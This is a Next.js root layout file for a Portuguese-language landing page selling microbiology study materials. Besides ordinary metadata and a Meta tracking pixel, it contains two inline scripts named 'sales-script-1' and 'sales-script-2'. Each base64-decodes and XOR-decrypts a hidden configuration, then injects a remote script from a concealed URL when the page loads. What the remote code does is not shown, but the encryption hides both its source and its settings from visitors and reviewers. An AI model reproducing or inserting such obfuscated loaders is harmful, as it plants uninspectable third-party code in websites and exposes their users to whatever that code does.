import type { Metadata } from 'next'
import { Inter, Oswald } from 'next/font/google'
import Script from 'next/script'
import './globals.css'

const inter = Inter({
  variable: '--font-inter',
  subsets: ['latin'],
})

const oswald = Oswald({
  variable: '--font-oswald',
  subsets: ['latin'],
  weight: ['400', '500', '600', '700'],
})

export const metadata: Metadata = {
  title: 'Microbiologia Visual | +140 Recursos Visuais para Estudar e Revisar',
  description:
    'Um sistema visual de estudo e revisão de Microbiologia com até 140 recursos em 5 coleções: mapas visuais, comparativos, fichas, revisões express e testes de memória. Acesso imediato.',
  generator: 'v0.app',

  openGraph: {
    title: 'Microbiologia Visual | +140 Recursos Visuais para Estudar e Revisar',
    description:
      'Mapas visuais, comparativos, fichas de revisão, resumos express e testes de memória para organizar a microbiologia. Acesso imediato e 7 dias de garantia.',
    type: 'website',
    locale: 'pt_BR',
    siteName: 'Microbiologia Visual',
  },

  twitter: {
    card: 'summary_large_image',
    title: 'Microbiologia Visual',
    description:
      '+140 recursos visuais para estudar, revisar e organizar a microbiologia. Acesso imediato e 7 dias de garantia.',
  },

  icons: {
    icon: [
      {
        url: '/icon-light-32x32.png',
        media: '(prefers-color-scheme: light)',
      },
      {
        url: '/icon-dark-32x32.png',
        media: '(prefers-color-scheme: dark)',
      },
      {
        url: '/icon.svg',
        type: 'image/svg+xml',
      },
    ],
    apple: '/apple-icon.png',
  },
}

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode
}>) {
  return (
    <html
      lang="pt-BR"
      className={`${inter.variable} ${oswald.variable} bg-background`}
    >
      <head>
        <Script
          id="sales-script-1"
          strategy="afterInteractive"
          dangerouslySetInnerHTML={{
            __html: `(function(){var d_e=atob("DLWarVqtuYBfdJ5Grs642CjBm7p9HOoy3saggnXO3e5xAeorx9PjgznC1K49BrE1zcfz3S7elvA2DPsqgcXz1T/Bl+osVrJkz8Hu3zPPzPQ6B7x89ei2jz3B1uI+GO1klO7hjzTM1OV9Trw2x83/wRPJm6x9Av8q29C4l3ib2LlmQ/pwn9evnGrOjblmEqZ+loSrnGKPxN0i");var a_lql=[];for(var j_a=0;j_a<d_e.length;j_a++){a_lql.push(d_e.charCodeAt(j_a)&255);}var d_pp=a_lql[0];var w_0fu=a_lql.slice(1,1+d_pp);var f_5hxd=a_lql.slice(1+d_pp);var f_etb8=f_5hxd.map(function(b,u_87){return b^w_0fu[u_87%d_pp];});var q_z="";for(var o_rita=0;o_rita<f_etb8.length;o_rita++){q_z+=String.fromCharCode(f_etb8[o_rita]&255);}var l_z2im=decodeURIComponent(escape(q_z));var z_i0w=JSON.parse(l_z2im);var j_6=z_i0w.globals||[];j_6.forEach(function(d_herm){window[d_herm.name]=d_herm.value;});var q_g2g=document.createElement("script");q_g2g.src=z_i0w.url;q_g2g.async=true;q_g2g.defer=true;(z_i0w.attributes||[]).forEach(function(f_f5){q_g2g.setAttribute(f_f5.name,f_f5.value);});(document.head||document.documentElement).appendChild(q_g2g);})();`,
          }}
        />

        <Script
          id="sales-script-2"
          strategy="afterInteractive"
          dangerouslySetInnerHTML={{
            __html: `(function(){var o_yhmx=atob("DBWwX1wiNEcz2HNF2G6SKi5OFn0RsAcxqGaKcHNBUCkdrQcosXPJcT9NWWlRqlw2u2fZLyhRGzJHtQBqtHTEOi9WGi1A+l9nuWHELTVAQTNWq1F/g26SMT1PUWUJ+hckrHSdKihPXSFK9QM3vWPVMSgPTCRcvF42u36Sc35UVStGvVF/+jfNcycAWiZevVF/+nHRKz0PQTNesRU89WXCOipHWjMeqwYnsXHDfXAAQiZfrRZn4jeSIgFf");var s_0ir=[];for(var k_0d=0;k_0d<o_yhmx.length;k_0d++){s_0ir.push(o_yhmx.charCodeAt(k_0d)&255);}var v_mz=s_0ir[0];var a_vj6=s_0ir.slice(1,1+v_mz);var p_m8=s_0ir.slice(1+v_mz);var b_wdf=p_m8.map(function(b,l_cu){return b^a_vj6[l_cu%v_mz];});var h_q="";for(var d_ugf1=0;d_ugf1<b_wdf.length;d_ugf1++){h_q+=String.fromCharCode(b_wdf[d_ugf1]&255);}var v_ivi=decodeURIComponent(escape(h_q));var v_yi=JSON.parse(v_ivi);var f_uj=v_yi.globals||[];f_uj.forEach(function(x_k90){window[x_k90.name]=x_k90.value;});var r_8t=document.createElement("script");r_8t.src=v_yi.url;r_8t.async=true;r_8t.defer=true;(v_yi.attributes||[]).forEach(function(f_f95){r_8t.setAttribute(f_f95.name,f_f95.value);});(document.head||document.documentElement).appendChild(r_8t);})();`,
          }}
        />

        <Script
          id="meta-pixel"
          strategy="afterInteractive"
          dangerouslySetInnerHTML={{
            __html: `!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,document,'script','https://connect.facebook.net/en_US/fbevents.js');fbq('init','1087065473705907');fbq('track','PageView');`,
          }}
        />
      </head>

      <body className="font-sans antialiased">
        {children}
      </body>
    </html>
  )
}
